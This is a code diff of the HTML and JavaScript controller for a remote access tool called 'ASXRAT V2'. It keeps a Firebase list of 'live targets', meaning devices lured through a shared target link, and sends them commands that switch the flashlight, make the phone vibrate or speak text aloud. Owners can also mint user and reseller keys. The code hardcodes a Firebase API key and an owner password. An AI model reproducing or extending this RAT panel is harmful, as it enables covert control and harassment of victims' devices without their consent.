@@ -3,50 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASXRAT V2</title>
+    <title>ASXRAT V2 CONTROL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root { --neon: #ffd700; --bg: #050505; --card: #111; }
         body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
         #auth { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .card { border: 1px solid var(--neon); padding: 25px; border-radius: 15px; background: var(--card); width: 85%; max-width: 350px; text-align: center; box-shadow: 0 0 15px var(--neon); }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #444; color: var(--neon); text-align: center; border-radius: 8px; font-weight: bold; outline: none; }
-        #dash { display: none; padding: 20px; max-width: 500px; margin: auto; }
-        .target-card { background: var(--card); border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 10px; border-left: 5px solid var(--neon); }
-        .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
-        .btn-rat { background: #222; color: #fff; border: 1px solid var(--neon); padding: 10px 2px; font-size: 9px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .btn-main { background: var(--neon); color: #000; border: none; padding: 12px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; margin-top: 10px; }
+        .card { border: 1px solid var(--neon); padding: 20px; border-radius: 12px; background: var(--card); width: 85%; max-width: 400px; text-align: center; box-shadow: 0 0 10px var(--neon); }
+        input, select { width: 90%; padding: 10px; margin: 8px 0; background: #1a1a1a; border: 1px solid #444; color: var(--neon); border-radius: 5px; text-align: center; outline: none; }
+        #dash { display: none; padding: 15px; }
+        .target-card { background: var(--card); border: 1px solid #333; padding: 12px; margin-bottom: 15px; border-radius: 10px; border-left: 4px solid var(--neon); }
+        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px; margin-top: 10px; }
+        .btn-rat { background: #222; color: #fff; border: 1px solid var(--neon); padding: 8px; font-size: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn-main { background: var(--neon); color: #000; border: none; padding: 12px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <div id="auth">
         <div class="card">
-            <h2 style="color:var(--neon); margin:0;">ASXRAT V2</h2>
-            <input type="password" id="key-input" placeholder="INPUT ACCESS KEY...">
-            <button onclick="login()" class="btn-main">LOGIN RAT</button>
+            <h2 style="color:var(--neon)">ASXRAT V2</h2>
+            <input type="password" id="key-input" placeholder="ACCESS KEY...">
+            <button onclick="login()" class="btn-main">LOGIN</button>
         </div>
     </div>
 
     <div id="dash">
-        <div class="card" style="width:100%; max-width:100%; margin-bottom:20px; box-sizing:border-box;">
-            <b id="user-display" style="color:var(--neon)">USER: ...</b><br>
-            <button class="btn-main" onclick="salinLink()">📋 SALIN LINK TARGET GUA</button>
-            <div id="owner-tools" style="display:none; margin-top:15px; border-top:1px solid #333; padding-top:15px;">
-                <input type="text" id="custom-key" placeholder="KETIK KEY CUSTOM...">
-                <button onclick="buatKey()" style="background:#00ff00; width:100%; border:none; padding:10px; border-radius:5px; font-weight:bold; color:#000;">CREATE & COPY KEY</button>
+        <div class="card" style="width:100%; max-width:100%; margin-bottom:15px; box-sizing:border-box;">
+            <b id="user-display" style="color:var(--neon)">USER: ...</b> <br>
+            <button class="btn-main" onclick="salinLink()" style="margin-top:10px;">📋 COPY MY TARGET LINK</button>
+            
+            <div id="owner-tools" style="display:none; margin-top:15px; border-top:1px solid #333; padding-top:10px;">
+                <b style="color:#00ff00">MANAGE KEYS</b>
+                <input type="text" id="new-key" placeholder="NAMA KEY...">
+                <select id="role-select">
+                    <option value="USER">ROLE: USER</option>
+                    <option value="RESELLER" id="opt-res">ROLE: OWNER</option>
+                </select>
+                <button onclick="buatKey()" style="background:#00ff00; width:100%; border:none; padding:10px; border-radius:5px; font-weight:bold;">CREATE KEY</button>
             </div>
         </div>
-        <h4 style="color:var(--neon)">LIST TARGET:</h4>
+
+        <h4 style="color:var(--neon)">📡 LIVE TARGETS:</h4>
         <div id="list"></div>
     </div>
 
 <script>
-    // GANTI PAKE LINK WEB TARGET LU
-    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html"; 
+    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html"; // GANTI PAKE LINK TARGET LU
 
-    // FIREBASE CONFIG LU SUDAH TERPASANG TOTAL
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
       authDomain: "rat-html.firebaseapp.com",
@@ -60,19 +65,21 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let myKey = "";
-    let amIOwner = false;
+    let myKey = ""; let myRole = "USER";
 
     function login() {
         const val = document.getElementById('key-input').value;
         if(val === "elvoxi122") {
-            myKey = "OWNER"; amIOwner = true;
+            myKey = "PEMILKK"; myRole = "PEMILIK";
             document.getElementById('owner-tools').style.display = 'block';
             start();
         } else {
             db.ref('mario/all_keys/' + val).once('value', (s) => {
-                if(s.exists()) { myKey = val; amIOwner = false; start(); }
-                else alert("KEY GAK VALID!");
+                if(s.exists()) {
+                    myKey = val; myRole = s.val().role || "USER";
+                    if(myRole === "OWNER") document.getElementById('owner-tools').style.display = 'block';
+                    start();
+                } else alert("KEY SALAH!");
             });
         }
     }
@@ -80,22 +87,23 @@
     function start() {
         document.getElementById('auth').style.display = 'none';
         document.getElementById('dash').style.display = 'block';
-        document.getElementById('user-display').innerText = "USER: " + myKey;
+        document.getElementById('user-display').innerText = `USER: ${myKey} (${myRole})`;
         
         db.ref('mario/targets').on('value', (snap) => {
             const container = document.getElementById('list');
             container.innerHTML = "";
             snap.forEach((child) => {
-                const data = child.val();
-                if(amIOwner || data.belongsTo === myKey) {
+                const d = child.val();
+                if(myRole === "PEMILIK" || d.belongsTo === myKey) {
                     container.innerHTML += `
                         <div class="target-card">
-                            <b style="color:var(--neon)">${data.model}</b> ${amIOwner ? `<br><small style="color:#555">KEY: ${data.belongsTo}</small>` : ''}
+                            <b style="color:var(--neon)">${d.model}</b> <br>
+                            <input type="text" id="tts-${child.key}" placeholder="Teks suara ke target..." style="width:100%; margin-top:5px; text-align:left;">
                             <div class="btn-grid">
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">SENTER ON</button>
+                                <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SUARA</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER ON</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'torch_off')">OFF</button>
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">GETAR</button>
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'play_audio')">SUARA</button>
                             </div>
                         </div>`;
                 }
@@ -103,22 +111,25 @@
         });
     }
 
-    function cmd(id, act) { 
-        db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); 
+    function cmd(id, act) { db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); }
+    
+    function sendTTS(id) {
+        const txt = document.getElementById('tts-' + id).value;
+        if(!txt) return alert("Isi teks!");
+        db.ref(`mario/commands/${id}`).set({ action: 'speak_text', text: txt, time: Date.now() });
     }
 
     function buatKey() {
-        let k = document.getElementById('custom-key').value;
-        if(!k) return alert("Isi dulu key-nya!");
-        db.ref('mario/all_keys/' + k).set({ created: Date.now() });
-        navigator.clipboard.writeText(k);
-        alert("KEY DIBUAT & DI-COPY: " + k);
+        const n = document.getElementById('new-key').value;
+        const r = document.getElementById('role-select').value;
+        if(!n) return;
+        db.ref('mario/all_keys/' + n).set({ role: r, createdBy: myKey });
+        alert("Key Berhasil Dibuat!");
     }
 
     function salinLink() {
-        const link = `${linkWebTarget}?key=${myKey}`;
-        navigator.clipboard.writeText(link);
-        alert("Link Target Berhasil Disalin!");
+        navigator.clipboard.writeText(`${linkWebTarget}?key=${myKey}`);
+        alert("Link Target Disalin!");
     }
 </script>
 </body>
